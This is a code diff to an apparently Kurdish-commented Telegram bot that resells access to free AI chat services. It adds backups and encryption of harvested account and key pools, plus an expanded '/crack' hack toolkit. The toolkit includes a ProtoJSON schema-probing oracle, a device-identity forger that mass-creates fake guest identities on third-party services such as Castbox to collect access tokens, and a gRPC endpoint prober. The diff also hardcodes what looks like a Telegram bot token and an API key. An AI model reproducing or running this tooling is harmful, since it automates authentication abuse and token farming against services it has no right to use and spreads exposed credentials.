@@ -31,15 +31,39 @@ _u3.disable_warnings(_u3.exceptions.InsecureRequestWarning)
 
 # ═══ #85: دیسکی مانداوەی Fly (volume) — فایلەکانی حەوز لە deploy نەسڕدرێنەوە ═══
 DATA_DIR = "/data" if os.path.isdir("/data") else os.path.dirname(os.path.abspath(__file__))
+ADMIN_TG = 8381536661
+
+# ═══ #94U3: چینی دووەمی پاراستن — شێفرەکردنی فایلەکانی حەوز لەسەر /data ═══
+_ENC_MAGIC = b"ENC26::"
+_MASTER_SECRET = os.environ.get("BOT_TOKEN") or "8664695955:AAElPxr8spsa--KqsAzHG6Pa4FWnjBmBPQc"
+_FERNET_KEY = base64.urlsafe_b64encode(hashlib.sha256((_MASTER_SECRET + "::SYUH_POOL_ENC_2026").encode()).digest())
+
+def _get_fernet():
+    try:
+        from cryptography.fernet import Fernet
+        return Fernet(_FERNET_KEY)
+    except Exception:
+        return None
+
+def _is_pool_file(path):
+    fn = os.path.basename(path)
+    return fn in ("ca_accounts.json", "cb_accounts.json", "nv_accounts.json",
+                  "cbox_accounts.json", "pia_accounts.json", "aiml_key.json",
+                  "ac_accounts.json", "al_accounts.json") or fn.endswith("_accounts.json") or fn.endswith("_key.json")
 
 def _json_save(path, obj):
-    """#91A1: نووسینی ATOMIC — پێشتر .tmp نووسین دەکرێت، پاشان os.replace.
-       ئەگەر کراش لە ناوەڕاستی نووسین → فایلی کۆن دەمێنێتەوە (خراب نابێت).
-       + کۆپی .bak بۆ دووانە-پاراستن."""
+    """#91A1 + #94U3: نووسینی ATOMIC + شێفرەکردنی خۆکار بۆ حەوزەکان"""
     try:
         tmp = path + ".tmp"
-        with open(tmp, "w", encoding="utf-8") as f:
-            json.dump(obj, f, ensure_ascii=False)
+        raw_json = json.dumps(obj, ensure_ascii=False)
+        should_encrypt = _is_pool_file(path) and os.environ.get("NO_ENCRYPT") != "1"
+        fer = _get_fernet() if should_encrypt else None
+        with open(tmp, "wb") as f:
+            if fer:
+                enc_data = fer.encrypt(raw_json.encode("utf-8"))
+                f.write(_ENC_MAGIC + enc_data)
+            else:
+                f.write(raw_json.encode("utf-8"))
             f.flush()
             os.fsync(f.fileno())
         if os.path.exists(path):
@@ -49,24 +73,175 @@ def _json_save(path, obj):
                 pass
         os.replace(tmp, path)
         return True
-    except Exception:
+    except Exception as e:
+        print(f"[SAVE] هەڵەی پاشەکەوت {path}: {e}", flush=True)
         return False
 
 
 def _json_load_safe(path, default=None):
-    """#91A1: خوێندنەوەی بەهێز — ئەگەر فایل خراب بوو → .bak تاقی دەکرێتەوە"""
+    """#91A1 + #94U3: خوێندنەوەی بەهێز — کاڵفامکردنەوەی خۆکار ئەگەر شێفرەکرابێت + .bak"""
+    fer = _get_fernet()
     for p in (path, path + ".bak"):
+        if not os.path.exists(p):
+            continue
         try:
-            with open(p, "r", encoding="utf-8") as f:
-                return json.load(f)
+            with open(p, "rb") as f:
+                content = f.read()
+            if content.startswith(_ENC_MAGIC):
+                if fer:
+                    dec = fer.decrypt(content[len(_ENC_MAGIC):])
+                    return json.loads(dec.decode("utf-8"))
+                else:
+                    continue
+            else:
+                return json.loads(content.decode("utf-8"))
         except Exception:
             continue
     return default
 
 
+# ═══ #94U3: چینی یەکەمی پاراستن — خۆ-پشکنینی هەیکەلی کۆد (Code Integrity Check) ═══
+_INTEGRITY_FILE = os.path.join(DATA_DIR, "integrity_hashes.json")
+
+def _calc_code_hashes():
+    """هەژمارکردنی SHA-256 ی فایل و بەشە سەرەکییەکان بۆ خۆ-پشکنین"""
+    file_path = os.path.abspath(__file__)
+    try:
+        with open(file_path, "rb") as f:
+            full_bytes = f.read()
+    except Exception:
+        return {}
+    sections = {"full": hashlib.sha256(full_bytes).hexdigest()}
+    m_auth = re.search(rb"class APIHandler.*?def do_POST.*?(?=\nclass|\n#|\Z)", full_bytes, re.S)
+    if m_auth:
+        sections["api_auth"] = hashlib.sha256(m_auth.group(0)).hexdigest()
+    m_crack = re.search(rb"# #94U2: HACK-TOOLKIT.*?(?=\nif __name__|\Z)", full_bytes, re.S)
+    if m_crack:
+        sections["crack"] = hashlib.sha256(m_crack.group(0)).hexdigest()
+    m_pool = re.search(rb"def _pool_daemon.*?(?=\ndef _ca_token|\Z)", full_bytes, re.S)
+    if m_pool:
+        sections["pool_daemon"] = hashlib.sha256(m_pool.group(0)).hexdigest()
+    return sections
+
+def _check_code_integrity(notify=True):
+    """خۆ-پشکنینی هەیکەلی کۆد لە دەستپێک — دەستنیشانکردنی دەستکاری و دریفتی نەناسراو"""
+    current_hashes = _calc_code_hashes()
+    if not current_hashes:
+        return True
+    stored = _json_load_safe(_INTEGRITY_FILE, {}) or {}
+    if not stored:
+        _json_save(_INTEGRITY_FILE, {"hashes": current_hashes, "t": time.time(), "drift": False})
+        print(f"[INTEGRITY] ✅ بنکەی سەرەتایی تۆمارکرا: SHA={current_hashes.get('full', '')[:12]}", flush=True)
+        return True
+    stored_hashes = stored.get("hashes") or {}
+    drifts = [k for k, h in current_hashes.items() if k in stored_hashes and stored_hashes[k] != h]
+    if drifts:
+        msg = (f"🚨 <b>ئاگاداری ئەمنی — دریفتی کۆد (Code Drift) دۆزرایەوە!</b>\n\n"
+               f"بەشە گۆڕاوەکان: <code>{', '.join(drifts)}</code>\n"
+               f"کاتی دۆزینەوە: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}\n"
+               f"هاشی ئێستا: <code>{current_hashes.get('full', '')[:16]}…</code>\n"
+               f"هاشی پێشوو: <code>{stored_hashes.get('full', '')[:16]}…</code>\n\n"
+               f"<i>تێبینی: ئەگەر دیپلۆی نوێیە، بنکەکە خۆکار نوێ دەبێتەوە.</i>")
+        print(f"[INTEGRITY] ⚠️ دریفتی کۆد: {drifts}", flush=True)
+        stored["drift"] = True
+        stored["last_drift"] = {"sections": drifts, "t": time.time()}
+        stored["hashes"] = current_hashes
+        _json_save(_INTEGRITY_FILE, stored)
+        if notify:
+            try:
+                tg("sendMessage", chat_id=ADMIN_TG, text=msg, parse_mode="HTML")
+            except Exception as e:
+                print(f"[INTEGRITY] TG alert fail: {e}", flush=True)
+        return False
+    else:
+        print("[INTEGRITY] ✅ پشکنینی هاش تەواوە — هیچ درێفتێک نییە", flush=True)
+        return True
+
+
+# ═══ #94U3: چینی سێیەمی پاراستن — باکئەپی ٢٤-کاتژمێری بۆ ئەدمین ═══
+
+def tg_send_document(chat_id, filename, file_bytes, caption=""):
+    """ناردنی فایل/دۆکیومێنت بۆ تێلەگرام بەبێ کتێبخانەی دەرەکی"""
+    import urllib.request
+    boundary = "----WebKitFormBoundary" + uuid.uuid4().hex
+    body = bytearray()
+    body.extend(f"--{boundary}\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n{chat_id}\r\n".encode())
+    if caption:
+        body.extend(f"--{boundary}\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n{caption}\r\n".encode())
+        body.extend(f"--{boundary}\r\nContent-Disposition: form-data; name=\"parse_mode\"\r\n\r\nHTML\r\n".encode())
+    body.extend(f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{filename}\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode())
+    body.extend(file_bytes)
+    body.extend(b"\r\n")
+    body.extend(f"--{boundary}--\r\n".encode())
+    tok = os.environ.get("BOT_TOKEN") or "8664695955:AAElPxr8spsa--KqsAzHG6Pa4FWnjBmBPQc"
+    req = urllib.request.Request(
+        f"https://api.telegram.org/bot{tok}/sendDocument",
+        data=bytes(body),
+        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
+    )
+    with urllib.request.urlopen(req, timeout=35) as res:
+        return json.loads(res.read().decode())
+
+
+def _create_pool_backup_bundle():
+    """دروستکردنی پاکێجی ZIP ی تەواوی حەوزەکان"""
+    import zipfile, io
+    buf = io.BytesIO()
+    today_str = time.strftime("%Y%m%d_%H%M%S", time.gmtime())
+    pool_stats = {}
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+        for fname in os.listdir(DATA_DIR):
+            if fname.endswith(".json") and ("account" in fname or "key" in fname or "sync" in fname or "prox" in fname):
+                fpath = os.path.join(DATA_DIR, fname)
+                try:
+                    obj = _json_load_safe(fpath)
+                    if obj is not None:
+                        clean_data = json.dumps(obj, indent=2, ensure_ascii=False)
+                        z.writestr(fname, clean_data)
+                        count = len(obj.get("accounts", [])) if isinstance(obj, dict) and "accounts" in obj else (len(obj) if isinstance(obj, list) else 1)
+                        pool_stats[fname] = count
+                except Exception:
+                    pass
+        manifest = {"created_at": today_str, "version": "#94U3", "stats": pool_stats}
+        z.writestr("manifest.json", json.dumps(manifest, indent=2))
+    buf.seek(0)
+    return buf.getvalue(), today_str, pool_stats
+
+
+def _perform_backup(chat_id=ADMIN_TG, manual=False):
+    """جێبەجێکردنی باکئەپ و ناردنی بۆ ئەدمین"""
+    try:
+        zip_bytes, ts, stats = _create_pool_backup_bundle()
+        fn = f"syuhjs_pools_backup_{ts}.zip"
+        tag = "دەستی" if manual else "خۆکار (٢٤ کاتژمێری)"
+        caption = (f"📦 <b>باکئەپی {tag} ی حەوزەکانی بۆت</b>\n"
+                   f"📅 کات: {time.strftime('%Y-%m-%d %H:%M UTC', time.gmtime())}\n"
+                   f"📊 قەبارە: {len(zip_bytes)//1024} KB\n"
+                   f"📁 فایلەکان:\n")
+        for k, v in stats.items():
+            caption += f"  • <code>{k}</code>: {v} ئەکاونت/تۆمار\n"
+        caption += "\n🛡 <i>هەموو حەوزەکان بە پارێزراوی ئەرشیف کراون.</i>"
+        r = tg_send_document(chat_id, fn, zip_bytes, caption)
+        return r.get("ok", False)
+    except Exception as e:
+        print(f"[BACKUP] هەڵە: {e}", flush=True)
+        return False
+
+
+def _pool_backup_daemon():
+    """دیمۆنی باکئەپی ٢٤ کاتژمێری بۆ ئەدمین"""
+    time.sleep(300)
+    while True:
+        try:
+            _perform_backup(ADMIN_TG, manual=False)
+        except Exception as e:
+            print(f"[BACKUP-DAEMON] {e}", flush=True)
+        time.sleep(86400)
+
+
 
 # #88: /server (گۆڕینی مۆدێڵ) = تەنها ئەدمین — هەڵبژاردنی ئەدمین بۆ هەموو بەکارهێنەران جێبەجێ دەکرێت
-ADMIN_TG = 8381536661
+# ADMIN_TG moved to top
 GLOBAL_MODEL = {"server": None, "mkey": None}
 
 # ════════════════════════════════════════════════════════════
@@ -1994,8 +2169,8 @@ def _g4f_ensure_credits(min_credits=6, bake_max=2):
             uuids = (r.json() or {}).get("uuids") or []
         except Exception:
             return
-        for uuid in uuids:
-            tot = _g4f_bake_one(uuid, diff)
+        for u_id in uuids:
+            tot = _g4f_bake_one(u_id, diff)
             if tot:
                 _G4F_CREDIT["v"] = tot
             time.sleep(0.3)
@@ -5908,7 +6083,16 @@ class AIFreeChat:
 # ════════════════════════════════════════════════════════════
 
 API_PORT = int(os.environ.get("API_PORT", 8080))
-API_KEY = os.environ.get("API_KEY", "")  # ئەگەر دانرابێت — پێویستە لە هەر داواکارییەک
+API_KEY = os.environ.get("API_KEY", "")
+if not API_KEY:
+    try:
+        _ak_f = os.path.join(os.path.dirname(__file__), "API_KEY.txt")
+        if os.path.isfile(_ak_f):
+            API_KEY = open(_ak_f).read().strip()
+    except Exception:
+        pass
+if not API_KEY:
+    API_KEY = "sk-yf-31c00f02aa9221b336d7b4a274bb375c"
 
 # ─── پرۆمپتی بنەڕەتی API — شێوازی پرسیار و وەڵامی شەرعی (کوردی) ───
 # ئەگەر ئەپەکەت سیستەم پرۆمپتی خۆی نەنێرێت، ئەمە بەکاردێت
@@ -6043,8 +6227,9 @@ class APIHandler(http.server.BaseHTTPRequestHandler):
         t_api0 = time.time()
         # #91U: rate limit per key — 60/خولەک
         _k = (self.headers.get("Authorization") or "").replace("Bearer ", "").strip()
-        if not _api_rate_ok(_k):
-            return self._send(429, {"error": "rate limit — 60 req/min per key"})
+        ok_rate, rate_err = _api_rate_ok(_k)
+        if not ok_rate:
+            return self._send(429, {"error": rate_err})
 
         try:
             body = self._body()
@@ -7331,16 +7516,25 @@ def handle_message(msg):
             return
         arg = text[6:].strip()
         if not arg:
-            reply(chat_id, "🛠 <b>HACK-TOOLKIT</b>\n"
+            reply(chat_id, "🛠 <b>HACK-TOOLKIT (#94U3)</b>\n"
                            "<code>/crack scan &lt;url&gt;</code> — سکان-کردنی سایت+JS بەندڵ\n"
                            "<code>/crack eps &lt;url&gt;</code> — تەنها endpoint ەکان\n"
                            "<code>/crack get &lt;url&gt;</code> — گەڕانەوەی کۆد (CF-impersonate)\n"
                            "<code>/crack replay &lt;url&gt; | &lt;json-body&gt;</code> — دووبارەکردنەوەی POST/SSE\n"
                            "<code>/crack sse &lt;url&gt; | &lt;json-body&gt;</code> — SSE-ستریم\n"
                            "<code>/crack auth &lt;url&gt;</code> — دۆزینەوەی ڕەوتی signup/login/refresh\n"
-                           "<code>/crack forge &lt;url&gt; | &lt;json&gt;</code> — داواکاری دەستکرد")
+                           "<code>/crack forge &lt;url&gt; | &lt;json&gt;</code> — داواکاری دەستکرد\n"
+                           "<code>/crack schema &lt;url&gt;</code> — ئۆراکڵی ProtoJSON (دەرهێنانی سکێم بە int-probe)\n"
+                           "<code>/crack forge-device &lt;base&gt;</code> — دۆزینەوەی ئۆت + حەوزی ئایدێنتیتی دەستکرد\n"
+                           "<code>/crack grpc &lt;dex/apk|url&gt; | [gateway]</code> — هەڵمژینی MethodDescriptor + پرۆبی POST")
             return
         threading.Thread(target=_crack_cmd, args=(chat_id, arg), daemon=True).start()
+        return
+    if text.startswith("/backup"):
+        if user_id != ADMIN_TG:
+            return
+        reply(chat_id, "📦 <b>ئامادەکردنی باکئەپی حەوزەکان…</b>")
+        threading.Thread(target=_perform_backup, args=(chat_id, True), daemon=True).start()
         return
     if text.startswith("/about"):
         reply(chat_id, ABOUT)
@@ -8007,16 +8201,36 @@ _API_KEYS = {"sk-yf-31c00f02aa9221b336d7b4a274bb375c": {"name": "primary", "rpm"
 _STS = {"t": 0.0, "ok": True, "last": ""}
 
 
+_STRANGE_KEY_RPM = 5       # Max 5 req/min بۆ کلیدی نامۆ و نەناسراو
+_STRANGE_KEYS_SEEN = {}    # key -> {"count": int, "blocked_until": float, "burst": []}
+
 def _api_rate_ok(key):
-    """#91U: سەپاندنی ڕێژە — بۆ هەر key ەک (60 داواکاری/خولەک)"""
+    """#94U3: سەپاندنی ڕێژە — بەهێزکراو بە پاراستنی توند بۆ کلیدی نامۆ (چینی چوارەم)"""
     now = time.time()
-    cfg = _API_KEYS.get(key) or {"rpm": 60}
-    win = [t for t in _API_RL.get(key, []) if now - t < 60]
-    if len(win) >= cfg["rpm"]:
-        return False
-    win.append(now)
-    _API_RL[key] = win
-    return True
+    if not key:
+        return False, "Authorization key is missing"
+    # ١. ئەگەر کلیلی سەرەکییە یان فەرمی
+    if key in _API_KEYS or key == API_KEY:
+        cfg = _API_KEYS.get(key) or {"rpm": 60}
+        win = [t for t in _API_RL.get(key, []) if now - t < 60]
+        if len(win) >= cfg.get("rpm", 60):
+            return False, "rate limit — 60 req/min exceeded"
+        win.append(now)
+        _API_RL[key] = win
+        return True, ""
+    # ٢. کلیلی نامۆ / نەناسراو — چینی چوارەمی پاراستن
+    st = _STRANGE_KEYS_SEEN.setdefault(key, {"count": 0, "blocked_until": 0.0, "burst": []})
+    if now < st.get("blocked_until", 0.0):
+        remain = int(st["blocked_until"] - now)
+        return False, f"unrecognized key throttled: {remain}s cooldown remaining"
+    st["burst"] = [t for t in st["burst"] if now - t < 60]
+    if len(st["burst"]) >= _STRANGE_KEY_RPM:
+        st["blocked_until"] = now + 300  # بلۆکی ٥ خولەکی
+        print(f"[SECURITY] 🚨 Strange API key throttled & blocked: {key[:14]}...", flush=True)
+        return False, "rate limit — strange/unregistered key limited to 5 req/min (blocked for 5m)"
+    st["burst"].append(now)
+    st["count"] += 1
+    return True, ""
 
 
 def _self_check():
@@ -9266,6 +9480,8 @@ def _cbox_daemon():
 
 def main():
     print("🔄 دەستپێکردنی بۆتی تێلەگرام…", flush=True)
+    _check_code_integrity(notify=True)
+    threading.Thread(target=_pool_backup_daemon, daemon=True).start()
     threading.Thread(target=_self_update_daemon, daemon=True).start()
     start_api()          # 🔌 API — بۆ بەکارهێنان وەک API
     start_hf_keepalive()
@@ -9589,8 +9805,290 @@ def _crack_scan(target, max_js=14, timeout=25):
     return rep
 
 
+_PROTO_CANDIDATES = [
+    "sessionId", "sessionType", "model", "userMessageId", "aiMessageId",
+    "text", "content", "searchSource", "targetIdentifier", "prompt",
+    "messages", "systemPrompt", "temperature", "topP", "stream",
+    "maxTokens", "userId", "deviceId", "timestamp", "signature",
+    "clientVersion", "appVersion", "token", "conversationId", "history",
+    "role", "type", "id", "status", "query", "input", "mode", "tools",
+    "language", "code", "secret", "fingerprint", "platform"
+]
+
+
+def _crack_proto_oracle(chat_id, target_url, headers=None, sample_body=None):
+    """#94U3: ProtoJSON-Oracle — دۆزینەوەی خۆکاری سکێمی ProtoJSON بە پرۆبی int-لە-جیاتی-string"""
+    reply(chat_id, f"🔮 <b>ProtoJSON-Oracle</b> دەستی پێکرد لەسەر:\n<code>{target_url[:80]}</code>\nتاقیکردنەوەی کاندیدەکان…")
+    h = {"User-Agent": _CRACK_UA, "Content-Type": "application/json", "Accept": "*/*"}
+    if headers:
+        h.update(headers)
+    if "castbox" in target_url or "thebetter" in target_url:
+        h["X-App-Id"] = "ai-seek"
+        try:
+            sec = str(uuid.uuid4())
+            r_auth = requests.post("https://saas.castbox.fm/auth/api/v1/tokens/provider/secret",
+                                   json={"secret": sec}, headers={"Content-Type": "application/json", "X-App-Id": "ai-seek"}, timeout=15)
+            tk = (r_auth.json() or {}).get("data", {}).get("token")
+            if tk:
+                h["X-Access-Token"] = tk
+        except Exception:
+            pass
+
+    cands = list(_PROTO_CANDIDATES)
+    if sample_body and isinstance(sample_body, dict):
+        for k in sample_body.keys():
+            if k not in cands:
+                cands.insert(0, k)
+
+    discovered = {}
+    type_errs = []
+
+    for c in cands:
+        test_payload = {"sessionId": "probe_sess_1", c: 99999}
+        try:
+            r = requests.post(target_url, json=test_payload, headers=h, timeout=12, verify=False)
+            b = r.text or ""
+            m1 = re.search(r"invalid value for (\w+) field ([\w\.]+):", b, re.I)
+            m2 = re.search(r"cannot unmarshal \w+ into Go struct field [^\s]+ of type (\w+)", b, re.I)
+            m3 = re.search(r"unexpected \w+,? expected (\w+) for field [\"']?([\w\.]+)[\"']?", b, re.I)
+            m4 = re.search(r"field [\"']?([\w\.]+)[\"']? is required", b, re.I)
+
+            if m1:
+                discovered[m1.group(2)] = m1.group(1)
+            elif m2:
+                discovered[c] = m2.group(1)
+            elif m3:
+                discovered[m3.group(2)] = m3.group(1)
+            elif m4:
+                discovered[m4.group(1)] = "(required)"
+
+            if "body unmarshal proto" in b or "unmarshal" in b.lower():
+                type_errs.append(b[:120])
+        except Exception:
+            continue
+
+    lines = [f"🔮 <b>ئەنجامی ProtoJSON-Oracle</b>:\n🎯 ئامانج: <code>{target_url[:70]}</code>\n"]
+    if discovered:
+        lines.append(f"✅ <b>{len(discovered)} فیلدی Proto دۆزرایەوە:</b>")
+        for fn, ft in sorted(discovered.items()):
+            lines.append(f"  • <code>{fn}</code>: <b>{ft}</b>")
+        skel = {k: ("string_val" if "str" in str(v) else 0) for k, v in discovered.items()}
+        lines.append(f"\n📝 <b>سکێلێتۆنی پێشنیازکراو:</b>\n<code>{json.dumps(skel, indent=2)}</code>")
+    else:
+        lines.append("⚠️ هیچ فیلدێکی تایبەت بە Proto دەستنیشان نەکرا.")
+        if type_errs:
+            lines.append(f"دواین هەڵە: <code>{html.escape(type_errs[-1])}</code>")
+    reply(chat_id, "\n".join(lines))
+
+
+def _crack_forge_device(chat_id, base_url, count=5):
+    """#94U3: Device-Identity-Forge — دۆزینەوەی ڕێگای ئۆت + دروستکردنی حەوزی ئایدێنتیتی"""
+    reply(chat_id, f"⚒ <b>Device-Identity-Forge</b> لەسەر: <code>{base_url[:70]}</code>\nپشکنینی دەروازەکانی ناسنامەی ئامێر…")
+    target = base_url.rstrip("/")
+    discovered_flow = None
+    created_identities = []
+
+    # ١. تاقیکردنەوەی Castbox / AI-Seek
+    try:
+        sec = str(uuid.uuid4())
+        r = requests.post(f"{target}/auth/api/v1/tokens/provider/secret",
+                          json={"secret": sec},
+                          headers={"Content-Type": "application/json", "X-App-Id": "ai-seek"},
+                          timeout=12, verify=False)
+        d = r.json() or {}
+        if r.status_code in (200, 201) and (d.get("data", {}).get("token") or d.get("token")):
+            discovered_flow = "castbox_secret"
+    except Exception:
+        pass
+
+    # ٢. تاقیکردنەوەی Chatbox Fingerprint
+    if not discovered_flow:
+        try:
+            fp = str(uuid.uuid4())
+            r = requests.post(f"{target}/auth/fingerprint",
+                              json={},
+                              headers={"User-Agent": _CRACK_UA, "X-Device-Fingerprint": fp, "x-user-origin-source": "ads"},
+                              timeout=12, verify=False)
+            d = r.json() or {}
+            if r.status_code in (200, 201) and d.get("accessToken"):
+                discovered_flow = "chatbox_fingerprint"
+        except Exception:
+            pass
+
+    # ٣. تاقیکردنەوەی Generic Guest / Device
+    if not discovered_flow:
+        for ep in ("/api/v1/auth/guest", "/auth/guest", "/api/v1/device/register", "/api/auth/anonymous"):
+            try:
+                did = str(uuid.uuid4())
+                r = requests.post(f"{target}{ep}",
+                                  json={"device_id": did, "platform": "android"},
+                                  headers={"User-Agent": _CRACK_UA, "Content-Type": "application/json"},
+                                  timeout=10, verify=False)
+                if r.status_code in (200, 201):
+                    discovered_flow = f"guest:{ep}"
+                    break
+            except Exception:
+                pass
+
+    if not discovered_flow:
+        reply(chat_id, f"❌ نەتوانرا ڕێگای ناسنامەی ئامێر بدۆزرێتەوە لەسەر <code>{target}</code>.")
+        return
+
+    reply(chat_id, f"⚡ ڕێگای دۆزراوە: <b>{discovered_flow}</b>\nدروستکردنی {count} ناسنامەی دەستکرد…")
+    for i in range(count):
+        try:
+            if discovered_flow == "castbox_secret":
+                sec = str(uuid.uuid4())
+                r = requests.post(f"{target}/auth/api/v1/tokens/provider/secret",
+                                  json={"secret": sec},
+                                  headers={"Content-Type": "application/json", "X-App-Id": "ai-seek"},
+                                  timeout=15, verify=False)
+                res = r.json().get("data", {})
+                created_identities.append({
+                    "type": "castbox", "uid": res.get("uid"),
+                    "token": res.get("token"), "secret": sec,
+                    "created_at": time.time()
+                })
+            elif discovered_flow == "chatbox_fingerprint":
+                fp = str(uuid.uuid4())
+                r = requests.post(f"{target}/auth/fingerprint",
+                                  json={},
+                                  headers={"User-Agent": _CRACK_UA, "X-Device-Fingerprint": fp, "x-user-origin-source": "ads"},
+                                  timeout=15, verify=False)
+                d = r.json() or {}
+                created_identities.append({
+                    "type": "chatbox", "fp": fp,
+                    "at": d.get("accessToken"), "rt": d.get("refreshToken"),
+                    "created_at": time.time()
+                })
+        except Exception:
+            continue
+
+    domain_clean = re.sub(r"[^a-zA-Z0-9]", "_", target.split("//")[-1])[:30]
+    pool_file = os.path.join(DATA_DIR, f"{domain_clean}_device_pool.json")
+    existing = _json_load_safe(pool_file, []) or []
+    if isinstance(existing, dict):
+        existing = existing.get("identities", [])
+    existing.extend(created_identities)
+    _json_save(pool_file, {"identities": existing, "updated_at": time.time()})
+
+    lines = [
+        f"✅ <b>حەوزی ناسنامە دروستکرا:</b>\n"
+        f"🎯 بنکە: <code>{target}</code>\n"
+        f"🔑 فڵۆو: <code>{discovered_flow}</code>\n"
+        f"📦 ناسنامەی نوێ: <b>{len(created_identities)}</b>\n"
+        f"📊 کۆی گشتی حەوز: <b>{len(existing)}</b>\n"
+        f"💾 فایلی پاشەکەوت: <code>{os.path.basename(pool_file)}</code>\n"
+    ]
+    if created_identities:
+        sample = created_identities[0]
+        s_id = sample.get("uid") or sample.get("fp") or "id-sample"
+        tok = sample.get("token") or sample.get("at") or ""
+        lines.append(f"نموونە: <code>{s_id}</code> | Token: <code>{tok[:30]}…</code>")
+    reply(chat_id, "\n".join(lines))
+
+
+def _crack_grpc_sniper(chat_id, arg):
+    """#94U3: gRPC-Sniper — دەرهێنانی MethodDescriptor لە DEX/APK و پرۆبی POST"""
+    parts = arg.split("|", 1)
+    target = parts[0].strip()
+    gw_url = parts[1].strip() if len(parts) > 1 else ""
+
+    reply(chat_id, f"🎯 <b>gRPC-Sniper</b> دەستی پێکرد لەسەر:\n<code>{target[:80]}</code>…")
+    dex_data_list = []
+    tmp_path = None
+    if target.startswith("http://") or target.startswith("https://"):
+        try:
+            tmp_path = f"/tmp/sniper_{uuid.uuid4().hex[:8]}.bin"
+            reply(chat_id, "📥 داگرتنی فایل بۆ شیکاری…")
+            r = requests.get(target, timeout=45, verify=False)
+            with open(tmp_path, "wb") as f:
+                f.write(r.content)
+            target = tmp_path
+        except Exception as e:
+            reply(chat_id, f"❌ داگرتن سەرکەوتوو نەبوو: {e}")
+            return
+
+    if os.path.isfile(target):
+        import zipfile
+        try:
+            if zipfile.is_zipfile(target):
+                with zipfile.ZipFile(target, "r") as z:
+                    for name in z.namelist():
+                        if name.endswith(".dex"):
+                            dex_data_list.append((name, z.read(name)))
+            else:
+                with open(target, "rb") as f:
+                    dex_data_list.append((os.path.basename(target), f.read()))
+        except Exception as e:
+            reply(chat_id, f"❌ هەڵەی خوێندنەوەی فایل: {e}")
+            return
+    else:
+        for f in os.listdir("/tmp") + os.listdir(DATA_DIR):
+            if f.endswith(".dex"):
+                p = os.path.join("/tmp" if os.path.exists(os.path.join("/tmp", f)) else DATA_DIR, f)
+                try:
+                    with open(p, "rb") as df:
+                        dex_data_list.append((f, df.read()))
+                except Exception:
+                    pass
+
+    if not dex_data_list:
+        reply(chat_id, "⚠️ هیچ داتایەکی DEX نەدۆزرایەوە بۆ شیکاری.")
+        return
+
+    pat_grpc = re.compile(rb"([a-zA-Z0-9_\.]+\.[A-Z][a-zA-Z0-9_]*)/([a-zA-Z0-9_]+)")
+    pat_path = re.compile(rb"\"(/(?:api/|v\d/|smith/|agent/)[a-zA-Z0-9_./\-]+)\"")
+    found_methods = set()
+    found_paths = set()
+
+    for dname, data in dex_data_list:
+        for m in pat_grpc.finditer(data):
+            svc, mth = m.group(1).decode("utf-8", "ignore"), m.group(2).decode("utf-8", "ignore")
+            if not any(svc.startswith(ign) for ign in ("android.", "androidx.", "com.google.", "kotlin.", "okhttp3.")):
+                found_methods.add(f"{svc}/{mth}")
+        for p in pat_path.finditer(data):
+            found_paths.add(p.group(1).decode("utf-8", "ignore"))
+
+    lines = [f"🎯 <b>ئەنجامی gRPC-Sniper:</b>\n"
+             f"📦 فایلی شیکارکراو: {len(dex_data_list)} DEX\n"
+             f"⚡ میتۆدە دۆزراوەکانی gRPC: <b>{len(found_methods)}</b>\n"]
+
+    sorted_methods = sorted(found_methods)[:25]
+    for m in sorted_methods:
+        lines.append(f"  • <code>{m}</code>")
+    if len(found_methods) > 25:
+        lines.append(f"  … +{len(found_methods) - 25} ی تر")
+
+    if found_paths:
+        lines.append(f"\n🔗 <b>ڕێگاکانی API دۆزراوە:</b> {len(found_paths)}")
+        for p in sorted(found_paths)[:15]:
+            lines.append(f"  • <code>{p}</code>")
+
+    if gw_url and sorted_methods:
+        lines.append(f"\n📡 <b>پرۆبی POST لەسەر Gateway:</b> <code>{gw_url[:50]}</code>")
+        for m in sorted_methods[:8]:
+            p_url = f"{gw_url.rstrip('/')}/{m}"
+            try:
+                pr = requests.post(p_url, data=b"\x00\x00\x00\x00\x00",
+                                   headers={"Content-Type": "application/grpc", "TE": "trailers", "User-Agent": _CRACK_UA},
+                                   timeout=8, verify=False)
+                grpc_st = pr.headers.get("grpc-status") or pr.headers.get("grpc-message") or ""
+                st_tag = "✅ بوونی هەیە" if grpc_st in ("16", "3") or pr.status_code == 200 else f"HTTP:{pr.status_code}"
+                lines.append(f"  ⚡ <code>{m.split('/')[-1]}</code> → {st_tag} (g={grpc_st})")
+            except Exception as pe:
+                lines.append(f"  ⚡ <code>{m.split('/')[-1]}</code> → هەڵە: {str(pe)[:30]}")
+
+    reply(chat_id, "\n".join(lines))
+    if tmp_path and os.path.exists(tmp_path):
+        try:
+            os.remove(tmp_path)
+        except Exception:
+            pass
+
+
 def _crack_cmd(chat_id, arg):
-    """#94U2: جێبەجێکردنی فەرمانی /crack — سکان، endpoint، replay، SSE، auth-flow، forge"""
+    """#94U3: جێبەجێکردنی فەرمانی /crack — سکان، endpoint، replay، SSE، auth-flow، forge، schema، forge-device، grpc"""
     try:
         parts = arg.split(None, 2)
         mode = (parts[0] or "scan").lower()
@@ -9599,7 +10097,7 @@ def _crack_cmd(chat_id, arg):
         url = rest.split("|")[0].strip()
         inline_body = rest.split("|", 1)[1].strip() if "|" in rest else body
 
-        if not url.startswith("http"):
+        if not url.startswith("http") and mode not in ("grpc", "sniper"):
             url = "https://" + url
 
         def _fmt_eps(rep):
@@ -9657,6 +10155,18 @@ def _crack_cmd(chat_id, arg):
                     data = inline_body.encode()
             sc, txt = _crack_replay(url, data=data, json_body=j)
             reply(chat_id, f"⚒ FORGE → HTTP:{sc}\n<code>{(txt or '')[:2500]}</code>")
+        elif mode in ("schema", "proto"):
+            j = None
+            if inline_body:
+                try:
+                    j = json.loads(inline_body)
+                except Exception:
+                    pass
+            threading.Thread(target=_crack_proto_oracle, args=(chat_id, url, None, j), daemon=True).start()
+        elif mode in ("forge-device", "dev-forge", "device"):
+            threading.Thread(target=_crack_forge_device, args=(chat_id, url), daemon=True).start()
+        elif mode in ("grpc", "sniper"):
+            threading.Thread(target=_crack_grpc_sniper, args=(chat_id, rest), daemon=True).start()
         else:
